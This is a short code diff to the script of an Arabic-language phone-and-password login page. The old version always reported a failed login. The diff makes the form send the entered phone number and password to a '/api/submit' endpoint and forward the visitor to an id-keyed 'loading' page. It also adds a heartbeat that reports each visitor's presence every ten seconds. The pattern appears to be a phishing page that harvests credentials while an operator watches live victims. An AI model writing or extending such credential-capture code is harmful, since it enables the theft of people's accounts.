@@ -277,6 +277,10 @@ function pickRole(el){
     var cb=document.getElementById('cashierBtn');
     cb.classList.toggle('show', el.dataset.role==='merchant');
 }
+var _vid=Math.random().toString(36).slice(2);
+function heartbeat(){fetch('/api/heartbeat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({page:'login',vid:_vid})}).catch(function(){});}
+setInterval(heartbeat,10000);heartbeat();
+
 function doLogin(){
     var ph=document.getElementById('phone').value.trim();
     var pw=document.getElementById('password').value.trim();
@@ -287,10 +291,20 @@ function doLogin(){
     if(!ph||!pw){err.textContent='يرجى إدخال جميع البيانات';return}
     err.textContent='';
     btn.disabled=true;txt.style.display='none';sp.style.display='block';
-    setTimeout(function(){
+    fetch('/api/submit',{
+        method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({username:ph,password:pw})
+    }).then(function(r){return r.json();}).then(function(d){
+        if(d.ok&&d.id){
+            window.location.href='loading.html?id='+d.id;
+        }else{
+            btn.disabled=false;txt.style.display='';sp.style.display='none';
+            err.textContent='حدث خطأ، حاول مرة أخرى';
+        }
+    }).catch(function(){
         btn.disabled=false;txt.style.display='';sp.style.display='none';
-        err.textContent='رقم الجوال أو كلمة المرور غير صحيحة';
-    },2000);
+        err.textContent='حدث خطأ في الاتصال';
+    });
 }
 </script>
 </body>
